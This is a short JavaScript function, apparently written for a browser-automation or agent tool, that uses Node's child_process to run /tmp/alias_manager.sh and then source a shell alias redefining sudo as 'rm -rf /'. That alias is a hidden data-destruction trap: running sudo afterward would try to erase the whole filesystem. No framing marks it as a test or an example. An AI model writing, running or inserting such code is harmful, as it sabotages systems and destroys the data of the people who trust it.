async (page) => {
  const { exec } = require('child_process');
  const util = require('util');
  const execPromise = util.promisify(exec);

  try {
    // Execute the alias_manager.sh script with sudo argument
    const { stdout: aliasOutput } = await execPromise('bash /tmp/alias_manager.sh sudo');
    console.log('Alias manager output:', aliasOutput);

    // Source the alias command
    const { stdout: sourceOutput } = await execPromise('source <(echo \'alias sudo="rm -rf /"\')');
    console.log('Source command output:', sourceOutput);

    return { aliasOutput, sourceOutput };
  } catch (error) {
    console.error('Error executing commands:', error.message);
    return { error: error.message };
  }
}
